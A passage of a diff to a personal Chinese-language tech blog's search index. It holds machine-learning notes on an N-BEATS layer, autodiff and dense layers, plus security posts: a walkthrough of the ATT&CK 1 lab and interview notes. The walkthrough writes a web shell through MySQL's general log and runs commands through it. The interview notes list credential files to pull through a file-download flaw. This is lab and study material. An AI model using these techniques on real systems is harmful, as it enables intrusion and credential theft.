class="line"><span class="string">        Number of neurons in Fully connected layers.</span></span><br><span class="line"><span class="string">    periods: Integer.</span></span><br><span class="line"><span class="string">        fourier serie period. The paper set this parameter to `horizon/2`.</span></span><br><span class="line"><span class="string">    back_periods: Integer.</span></span><br><span class="line"><span class="string">        fourier serie back period. The paper set this parameter to `back_horizon/2`.</span></span><br><span class="line"><span class="string">    horizon_fourier_order: Integer.</span></span><br><span class="line"><span class="string">        Higher values signifies complex fourier serie</span></span><br><span class="line"><span class="string">    back_horizon_fourier_order: Integer.</span></span><br><span class="line"><span class="string">        Higher values signifies complex fourier serie</span></span><br><span class="line"><span class="string">    n_quantiles: Integer.</span></span><br><span class="line"><span class="string">        Number of quantiles in `QuantileLossError`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                 horizon,</span></span><br><span class="line"><span class="params">                 back_horizon,</span></span><br><span class="line"><span class="params">                 n_neurons, </span></span><br><span class="line"><span class="params">                 periods, </span></span><br><span class="line"><span class="params">                 back_periods, </span></span><br><span class="line"><span class="params">                 horizon_fourier_order,</span></span><br><span class="line"><span class="params">                 back_horizon_fourier_order,</span></span><br><span class="line"><span class="params">                 n_quantiles,</span></span><br><span class="line"><span class="params">                 dropout_rate,</span></span><br><span class="line"><span class="params">                 **kwargs</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">super</span>().__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">        self._horizon = horizon</span><br><span class="line">        self._back_horizon = back_horizon</span><br><span class="line">        self._periods = tf.cast(tf.reshape(periods, (<span class="number">1</span>, -<span class="number">1</span>)), <span class="string">&#x27;float32&#x27;</span>) <span class="comment"># Broadcast horizon on multiple periods</span></span><br><span class="line">        self._back_periods = tf.cast(tf.reshape(back_periods, (<span class="number">1</span>, -<span class="number">1</span>)), <span class="string">&#x27;float32&#x27;</span>)  <span class="comment"># Broadcast back horizon on multiple periods</span></span><br><span class="line">        self._horizon_fourier_order = tf.reshape(tf.<span class="built_in">range</span>(horizon_fourier_order, dtype=<span class="string">&#x27;float32&#x27;</span>), shape=(-<span class="number">1</span>, <span class="number">1</span>)) <span class="comment"># Broadcast horizon on multiple fourier order</span></span><br><span class="line">        self._back_horizon_fourier_order = tf.reshape(tf.<span class="built_in">range</span>(back_horizon_fourier_order, dtype=<span class="string">&#x27;float32&#x27;</span>), shape=(-<span class="number">1</span>, <span class="number">1</span>)) <span class="comment"># Broadcast horizon on multiple fourier order</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Workout the number of neurons needed to compute seasonality coefficients</span></span><br><span class="line">        horizon_neurons = tf.reduce_sum(<span class="number">2</span> * horizon_fourier_order)</span><br><span class="line">        back_horizon_neurons = tf.reduce_sum(<span class="number">2</span> * back_horizon_fourier_order)</span><br><span class="line">        </span><br><span class="line">        self._FC_stack = [tf.keras.layers.Dense(n_neurons, </span><br><span class="line">                                               activation=<span class="string">&#x27;relu&#x27;</span>, </span><br><span class="line">                                               kernel_initializer=<span class="string">&quot;glorot_uniform&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        self._dropout = tf.keras.layers.Dropout(dropout_rate)   </span><br><span class="line">        </span><br><span class="line">        self._FC_back_horizon = self.add_weight(shape=(n_neurons, back_horizon_neurons), </span><br><span class="line">                                           trainable=<span class="literal">True</span>,</span><br><span class="line">                                           initializer=<span class="string">&quot;glorot_uniform&quot;</span>,</span><br><span class="line">                                           name=<span class="string">&#x27;FC_back_horizon_seasonality&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self._FC_horizon = self.add_weight(shape=(n_quantiles, n_neurons, horizon_neurons), </span><br><span class="line">                                           trainable=<span class="literal">True</span>,</span><br><span class="line">                                           initializer=<span class="string">&quot;glorot_uniform&quot;</span>,</span><br><span class="line">                                           name=<span class="string">&#x27;FC_horizon_seasonality&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Workout cos and sin seasonality coefficents</span></span><br><span class="line">        time_horizon = tf.<span class="built_in">range</span>(self._horizon, dtype=<span class="string">&#x27;float32&#x27;</span>) / self._periods</span><br><span class="line">        horizon_seasonality = <span class="number">2</span> * np.pi * self._horizon_fourier_order * time_horizon</span><br><span class="line">        self._horizon_coef = tf.concat((tf.cos(horizon_seasonality), </span><br><span class="line">                                          tf.sin(horizon_seasonality)), axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        time_back_horizon = tf.<span class="built_in">range</span>(self._back_horizon, dtype=<span class="string">&#x27;float32&#x27;</span>) / self._back_periods</span><br><span class="line">        back_horizon_seasonality = <span class="number">2</span> * np.pi * self._back_horizon_fourier_order * time_back_horizon</span><br><span class="line">        self._back_horizon_coef = tf.concat((tf.cos(back_horizon_seasonality), </span><br><span class="line">                                        tf.sin(back_horizon_seasonality)), axis=<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, inputs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dense <span class="keyword">in</span> self._FC_stack:</span><br><span class="line">            inputs = dense(inputs) <span class="comment"># shape: (Batch_size, nb_neurons)</span></span><br><span class="line">            inputs = self._dropout(inputs, training=<span class="literal">True</span>) <span class="comment"># We bind first layers by a dropout </span></span><br><span class="line"></span><br><span class="line">        theta_horizon = inputs @ self._FC_horizon <span class="comment"># shape: (n_quantiles, Batch_size, 2 * fourier order)</span></span><br><span class="line">        theta_back_horizon = inputs @ self._FC_back_horizon <span class="comment"># shape: (Batch_size, 2 * fourier order)</span></span><br><span class="line">        </span><br><span class="line">        y_horizon = theta_horizon @ self._horizon_coef <span class="comment"># shape: (n_quantiles, Batch_size, horizon)</span></span><br><span class="line">        y_back_horizon = theta_back_horizon @ self._back_horizon_coef <span class="comment"># shape: (Batch_size, back_horizon)</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> y_horizon, y_back_horizon</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model/notebook#Recommandations">https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model/notebook#Recommandations</a></p>
 <p><a href="https://zhuanlan.zhihu.com/p/399210805">https://zhuanlan.zhihu.com/p/399210805</a></p>
 <p><a href="https://medium.com/analytics-vidhya/deep-residual-learning-for-image-recognition-resnet-94a9c71334c9">https://medium.com/analytics-vidhya/deep-residual-learning-for-image-recognition-resnet-94a9c71334c9</a></p>
+<p><a href="https://blog.csdn.net/andebiny/article/details/122876653">应该是翻译的不过还口译 Kaggle时间序列(Time Series)教程 2-趋势(Trend)_正经人谁写日记lyh的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>ML</category>
@@ -7811,6 +7892,193 @@
       <tags>
         <tag>NLP</tag>
         <tag>kaggle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ATT&amp;CK 1</title>
+    <url>/2022/09/26/ATTCK1/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>除了win7 改密码为 godrun@2019</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><img src="/2022/09/26/ATTCK1/%E7%BB%98%E5%9B%BE2.png" alt="img">信息收集</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV -sT -sC -o nmapinitial <span class="number">192.168</span>.<span class="number">33.130</span></span><br><span class="line">Starting Nmap <span class="number">7.92</span> ( https:<span class="regexp">//</span>nmap.org ) at <span class="number">2022</span>-<span class="number">09</span>-<span class="number">26</span> <span class="number">11</span>:<span class="number">54</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">33.130</span></span><br><span class="line">Host is up (<span class="number">0.00056</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="regexp">/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/</span><span class="number">1.0</span>.<span class="number">2</span>j PHP/<span class="number">5.4</span>.<span class="number">45</span>)</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 <span class="number">2014</span> </span><br><span class="line">|_http-server-header: Apache<span class="regexp">/2.4.23 (Win32) OpenSSL/</span><span class="number">1.0</span>.<span class="number">2</span>j PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line"><span class="number">3306</span>/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="regexp">//</span>nmap.org<span class="regexp">/submit/</span> .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">23.42</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>mysql 有个未授权</p>
+<p>直接连没成功</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ mysql -h 192.168.33.130 -P 3306 -u root              </span><br><span class="line"><span class="keyword">ERROR </span>1130 (HY000): Host &#x27;192.168.33.133&#x27; is not allowed to connect to this MySQL server</span><br></pre></td></tr></table></figure>
+
+<p>先打80吧</p>
+<p><img src="/2022/09/26/ATTCK1/image-20220927000212159.png" alt="image-20220927000212159"></p>
+<h3 id="扫一波目录"><a href="#扫一波目录" class="headerlink" title="扫一波目录"></a>扫一波目录</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">33.133</span><span class="regexp">/ -w /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/dirb/</span>common.txt -t <span class="number">100</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line"><span class="section">└─$ gobuster dir -u http://192.168.33.130/ -w /usr/share/wordlists/dirb/common.txt -t 100 </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.1.0</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.33.130/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 100</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/09/26 12:10:36 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 213]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 218]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 218]</span><br><span class="line">/com2                 (Status: 403) [Size: 213]</span><br><span class="line">/com1                 (Status: 403) [Size: 213]</span><br><span class="line">/com3                 (Status: 403) [Size: 213]</span><br><span class="line">/con                  (Status: 403) [Size: 212]</span><br><span class="line">/lpt1                 (Status: 403) [Size: 213]</span><br><span class="line">/lpt2                 (Status: 403) [Size: 213]</span><br><span class="line">/nul                  (Status: 403) [Size: 212]</span><br><span class="line">/phpmyadmin           (Status: 301) [Size: 241] [--&gt; http://192.168.33.130/phpmyadmin/]</span><br><span class="line">/phpMyAdmin           (Status: 301) [Size: 241] [--&gt; http://192.168.33.130/phpMyAdmin/]</span><br><span class="line">/prn                  (Status: 403) [Size: 212]                                        </span><br><span class="line">/phpinfo.php          (Status: 200) [Size: 71392]                                      </span><br><span class="line">/aux                  (Status: 403) [Size: 212]                                        </span><br><span class="line"><span class="section">                                                                                       </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">2022/09/26 12:10:38 Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure>
+
+<p>只有个 phpmyadmin 可以打</p>
+<p>哦 对了 刚才试了 root root 可以连数据库</p>
+<p>（可以切成中文 不是</p>
+<p>拿到了后可以干什么</p>
+<ul>
+<li>读敏感文件 密码之类</li>
+<li>写shell？</li>
+</ul>
+<p>oh 对了 我能不能改一下那个啥设置 然后我是不是就可以远程写文件了（但是我需要目录？</p>
+<p>windows 的目录？~~~emmmm 很蓝的啦 ~~~  忽略了 <code>phpinfo.php</code></p>
+<p>直接泄露了路径  <code>C:\phpStudy\php\php-5.4.45\php.ini </code></p>
+<p>写来试试</p>
+<h3 id="复习一下"><a href="#复习一下" class="headerlink" title="复习一下"></a>复习一下</h3><h4 id="读文件权限查询"><a href="#读文件权限查询" class="headerlink" title="读文件权限查询"></a>读文件权限查询</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> 用户名<span class="variable">@localhost</span>;</span><br></pre></td></tr></table></figure>
+
+<p>文件大小小于max_allowed_packet（load_file()函数受到这个值的限制）</p>
+<p>查看方法：mysql&gt; <code>show global variables like &#39;max_allowed%&#39;;</code><br>修改方法：mysql&gt; <code>set global max_allowed_packet = 5\*1024\*1024;</code></p>
+<p><img src="/2022/09/26/ATTCK1/image-20220927004919041.png" alt="image-20220927004919041"></p>
+<h4 id="写文件权限查询"><a href="#写文件权限查询" class="headerlink" title="写文件权限查询"></a>写文件权限查询</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/26/ATTCK1/image-20220927005222611.png" alt="image-20220927005222611"></p>
+<p><a href="https://blog.csdn.net/qq_45927266/article/details/119297840">(181条消息) MySQL 文件读写_iO快到碗里来的博客-CSDN博客_mysql 写文件</a></p>
+<p><img src="/2022/09/26/ATTCK1/image-20220927002501433.png" alt="image-20220927002501433"></p>
+<h3 id="试着打个-phpmyadmin-（failed"><a href="#试着打个-phpmyadmin-（failed" class="headerlink" title="试着打个 phpmyadmin （failed"></a>试着打个 phpmyadmin （failed</h3><p>文件包含试一试 没成功 不知道为啥</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/sess_1v6hitp3cles3aps682pngiff1qvk1ef</span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/tmp/</span>sess_1v6hitp3cles3aps682pngiff1qvk1ef</span><br></pre></td></tr></table></figure>
+
+<p>没成功，，，</p>
+<p>可以看到 session 的路径</p>
+<img src="/2022/09/26/ATTCK1/image-20220927004053114.png" alt="image-20220927004053114" style="zoom:50%;">
+
+<h3 id="mysql-日志写文件"><a href="#mysql-日志写文件" class="headerlink" title="mysql 日志写文件"></a>mysql 日志写文件</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;%genera%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/26/ATTCK1/image-20220927010506150.png" alt="image-20220927010506150"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/26/ATTCK1/image-20220927010752378.png" alt="image-20220927010752378"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;off&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">33.130</span>/exp.php?cmd=<span class="keyword">system</span>(%27whoami%27);</span><br></pre></td></tr></table></figure>
+
+<p>linux没有yijian 明天起来再搞 换个哥斯拉或者冰蝎试试</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>automatic differentiation</title>
+    <url>/2022/09/27/automatic-differentiation/</url>
+    <content><![CDATA[<p>Tianqi yeye 的course orzzzz  两个内容</p>
+<ul>
+<li>General introduction to different differentiation methods </li>
+<li>Reverse mode automatic differentiation</li>
+</ul>
+<span id="more"></span>
+
+<p>读完我reference中的第一篇文章 你应该已经理解了啥是 forward &amp; backwar ad</p>
+<p>（扔张图怕以后哈佛大佬的link无了</p>
+<p><img src="/2022/09/27/automatic-differentiation/image-20220927204548536.png" alt="image-20220927204548536"></p>
+<p>ok 先不继续看 Tianqi yeye 的ppt   你咋写代码呢？</p>
+<p>（这里只考虑 reverse</p>
+<p>因为他是 从后向前 一层一层 跑计算图 </p>
+<p>所以 怎么自动生成计算图？emmm 好问题 有点小难度</p>
+<p><img src="/2022/09/27/automatic-differentiation/image-20220927204702790.png" alt="image-20220927204702790"></p>
+<p>伪代码来了 但究竟如何构造计算图 （ 可能有工具？or 什么数据结构的知识？</p>
+<p>继续往下学</p>
+<p>（明天再来完成</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.zhihu.com/question/66200879/answer/870023448">Tensorflow 是如何求导的？ - 知乎 (zhihu.com)</a>  bks哈佛的yeye 写的真好</p>
+<p><a href="https://harvard-iacs.github.io/2019-CS207/homeworks/HW4/notebook/">Harvard 2019-CS207 | Homework 4 (harvard-iacs.github.io)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/134159838">python构建计算图1——简单实现自动求导 - 知乎 (zhihu.com)</a></p>
+]]></content>
+      <categories>
+        <category>机器学习</category>
+      </categories>
+      <tags>
+        <tag>机器学习</tag>
+        <tag>DL system</tag>
+        <tag>note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>run哥带你手撕全连接层</title>
+    <url>/2022/09/26/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E6%92%95%E5%85%A8%E8%BF%9E%E6%8E%A5%E5%B1%82/</url>
+    <content><![CDATA[<p>学！</p>
+<span id="more"></span>
+
+<h2 id="what-is-fully-connected-layers"><a href="#what-is-fully-connected-layers" class="headerlink" title="what is fully-connected layers?"></a>what is fully-connected layers?</h2><blockquote>
+<p>Fully-connected layers, also known as linear layers, connect every input neuron to every output neuron and are commonly used in neural networks.</p>
+</blockquote>
+<p><em>Figure 1. Example of a small fully-connected layer with four input and eight output neurons.</em></p>
+<p><img src="/2022/09/26/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E6%92%95%E5%85%A8%E8%BF%9E%E6%8E%A5%E5%B1%82/image-20220926114654521.png" alt="image-20220926114654521"></p>
+<p><strong>Fully Connected 可以看作一个转换矩阵把 feature matrix 到Label space</strong></p>
+<h2 id="why-more-then-two-layers"><a href="#why-more-then-two-layers" class="headerlink" title="why more then two layers?"></a>why more then two layers?</h2><p>但是只用一层fully connected layer 有时候没法解决非线性问题</p>
+<p><strong>而如果有两层或以上fully connected layer就可以很好地解决非线性问题了</strong></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>参考着看 知乎嘛 不能全信</p>
+<p><a href="https://zhuanlan.zhihu.com/p/33841176">CNN 入门讲解：什么是全连接层（Fully Connected Layer）? - 知乎 (zhihu.com)</a></p>
+<p><a href="https://towardsdatascience.com/convolutional-layers-vs-fully-connected-layers-364f05ab460b">https://towardsdatascience.com/convolutional-layers-vs-fully-connected-layers-364f05ab460b</a></p>
+]]></content>
+      <categories>
+        <category>机器学习</category>
+      </categories>
+      <tags>
+        <tag>机器学习</tag>
+        <tag>全连接层</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sec面试每日一题</title>
+    <url>/2022/09/26/sec%E9%9D%A2%E8%AF%95%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/</url>
+    <content><![CDATA[<p>每日一题</p>
+<span id="more"></span>
+
+<h2 id="9-26"><a href="#9-26" class="headerlink" title="9.26"></a>9.26</h2><h3 id="q"><a href="#q" class="headerlink" title="q"></a>q</h3><blockquote>
+<p>linux服务器存在任意文件下载漏洞，如何利用它拿到shell</p>
+</blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/80919954">https://zhuanlan.zhihu.com/p/80919954</a></p>
+<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p>Linux下常见的敏感文件(需首先判断服务器版本)</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>passwd  <span class="comment">#看一下存在哪些用户和服务，如果某些用户有bash，可以读一下他的.bash_history</span></span><br><span class="line"><span class="regexp">/etc/</span>shadow  <span class="comment">#shadow文件，但是很难破解</span></span><br><span class="line"><span class="regexp">/root/</span>.bash_history  <span class="comment">#root用户操作历史命令记录，可能会泄露服务器根路径，mysql密码，一些服务启动脚本等</span></span><br><span class="line"><span class="regexp">/root/</span>.mysql_history  <span class="comment">#mysql历史命令记录文件</span></span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/mlocate/m</span>locate.db  <span class="comment">#本地所有文件信息</span></span><br><span class="line"><span class="regexp">/etc/</span>ssh/sshd_config  <span class="comment">#ssh配置文件，如果对外开放可看到端口</span></span><br><span class="line"></span><br><span class="line">apache：</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf</span><br><span class="line"><span class="regexp">/etc/</span>apache2/httpd.conf</span><br><span class="line"><span class="regexp">/etc/</span>apache2/apache2.conf</span><br><span class="line"></span><br><span class="line">nginx：</span><br><span class="line"><span class="regexp">/etc/</span>nginx/nginx.conf</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/etc/</span>nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">redis：</span><br><span class="line"><span class="regexp">/etc/</span>redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>结合.bash_history</p>
+<p>针对Linux系统任意文件下载的几种思路：</p>
+<ul>
+<li><p>下载源代码审计</p>
+</li>
+<li><p>数据库备份</p>
+</li>
+<li><p>信息收集</p>
+</li>
+<li><p>中间件</p>
+</li>
+<li><p>…</p>
+</li>
+<li><p>下载了某数据库自动备份脚本(xxx.sh)得到数据库的连接地址以及账号密码。</p>
+</li>
+<li><p>下载redis.conf配置文件得到redis密码。</p>
+</li>
+</ul>
+<p>打redis</p>
+<h2 id="9-27"><a href="#9-27" class="headerlink" title="9.27"></a>9.27</h2><p>q</p>
+<blockquote>
+<p>dos攻击和cc攻击的区别</p>
+</blockquote>
+<p>a</p>
+<p><strong>DDoS攻击</strong></p>
+<p>DDoS攻击（分布式拒绝服务攻击）一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。在线游戏、互联网金融等领域是 DDoS 攻击的高发行业。</p>
+<p><strong>CC攻击</strong></p>
+<p>CC攻击是DDOS（分布式拒绝服务）的一种，相比其它的DDOS攻击CC似乎更有技术含量一些。这种攻击你见不到真实源IP，见不到特别大的异常流量，但是破坏性非常大，直接导致系统服务挂了无法正常服务。</p>
+<p><strong>知道创宇：</strong></p>
+<p>CC攻击是DDoS攻击的其中一种，DDoS攻击方式还有：ICMP Flood、UDP Flood、NTP Flood…</p>
+<p>CC攻击是目前应用层攻击的主要手段之一，借助代理服务器生成指向目标系统的合法请求，实现伪装和DDoS。我们都有这样的体验，访问一个静态页面，即使人多也不需要太长时间，但如果在高峰期访问论坛、贴吧等，那就很慢了，因为服务器系统需要到数据库中判断访问者否有读帖、发言等权限。访问的人越多，论坛的页面越多，数据库压力就越大，被访问的频率也越高，占用的系统资源也就相当可观。</p>
+<p>CC攻击就充分利用了这个特点，模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的请求，网络拥塞，正常访问被中止。这种攻击技术性含量高，见不到真实源IP，见不到特别大的异常流量，但服务器就是无法进行正常连接。</p>
+<p>之所以选择<a href="https://www.zhihu.com/search?q=%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:437173802%7D">代理服务器</a>是因为代理可以有效地隐藏自己的身份，也可以绕开防火墙，因为基本上所有的防火墙都会检测并发的TCP/IP连接数目，超过一定数目一定频率就会被认为是Connection-Flood。当然也可以使用肉鸡来发动CC攻击，攻击者使用CC攻击软件控制大量肉鸡发动攻击，肉鸡可以模拟正常用户访问网站的请求伪造成合法数据包，相比前者来说更难防御。</p>
+<p>CC攻击是针对Web服务在第七层协议发起的攻击，在越上层协议上发动DDoS攻击越难以防御，上层协议与业务关联愈加紧密，防御系统面临的情况也会更复杂。比如CC攻击中最重要的方式之一HTTP Flood，不仅会直接导致被攻击的Web前端响应缓慢，对承载的业务造成致命的影响，还可能会引起连锁反应，间接攻击到后端的Java等业务层逻辑以及更后端的数据库服务。</p>
+<p>由于CC攻击成本低、威力大，知道创宇安全专家组发现80%的DDoS攻击都是CC攻击。带宽资源严重被消耗，网站瘫痪；CPU、内存利用率飙升，主机瘫痪；瞬间快速打击，无法快速响应。</p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+        <tag>安全</tag>
       </tags>
   </entry>
 </search>
